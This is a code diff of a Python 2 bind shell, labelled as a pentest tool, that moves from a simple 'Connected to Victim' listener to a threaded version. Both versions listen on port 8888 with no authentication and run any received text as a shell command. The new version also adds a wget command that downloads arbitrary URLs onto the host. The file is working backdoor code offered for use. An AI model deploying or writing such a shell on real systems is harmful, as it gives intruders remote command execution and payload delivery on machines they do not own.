@@ -3,37 +3,69 @@
 
 #**************************************************************************#
 #  Filename: py_bind_shel.py            (Created: 2016-08-14)              #
-#                                       (Updated: XXXX-XX-XX)              #
+#                                       (Updated: 2016-10-02)              #
 #  Info:                                                                   #
 #    TBG Security Python BIND Shell for pentest                            #
 #  Author:                                                                 #
 #    Ryan Hays                                                             #
 #**************************************************************************#
 
-import subprocess
+
 import socket
-import sys
 import os
-host = "0.0.0.0"
-port = int(8888)
+import thread
+import subprocess
+import urllib2
+
+
+def connection(conn):
+    conn.setblocking(1)
+    conn.send('Connection Established!')
+    while True:
+            conn.send('\n$')
+            data = conn.recv(1024)
+
+            if data.strip('\r\n') == 'quit' or data.strip('\r\n') == 'exit':
+                    conn.close()
+                    break
+            elif data.strip('\r\n').startswith('cd'):
+                    try:
+                            os.chdir(data.strip('\r\n')[3:])
+                    except:
+                            conn.send('The system path cannot be found!')
+            elif data.strip('\r\n').startswith('wget'):
+                    try:
+                            f = open(os.path.basename(data[5:]), "wb")
+                            f.write(urllib2.urlopen(data[5:]))
+                            f.close()
+                            conn.send("Successfully downloaded %s" % os.path.basename(data[5:]))
+                    except:
+                            conn.send("Download failed!")
+            else:
+                    proc = subprocess.Popen(data.strip('\r\n'), shell=True, stdout=subprocess.PIPE,
+                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdoutput = proc.stdout.read() + proc.stderr.read()
+                    conn.send(stdoutput)
+
+
 while True:
-        try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.bind((host, port))
-                s.listen(4)
-                while True:
-                        c,addr = s.accept()
-                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n" % (addr[0], port))
-                        for tym in range(0, 50):
-                                data=c.recv(1024)
-                                for line in os.popen(data):
-                                        c.send(line)
-        except KeyboardInterrupt:
-                c.send("\n\t[ctrl+c] server closed by Victim.\n")
-                s.close()
-                sys.exit(1)
-        except socket.error:
-                print "\n\t[error] Address { %s : %s } already in use." % (host, port)
-                print "\t[error] just wait a bit until we correct it for you."
-                s.close()
-                print "\n\ntrying again ...."
+    try:
+            s = socket.socket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+            s.bind(('', 8888))
+            s.listen(5)
+
+            while True:
+                    s.settimeout(2)
+                    try:
+                            conn, addr = s.accept()
+
+                    except socket.timeout:
+                            continue
+
+                    if (conn):
+                            s.settimeout(None)
+                            thread.start_new_thread(connection, (conn,))
+    except:
+            pass
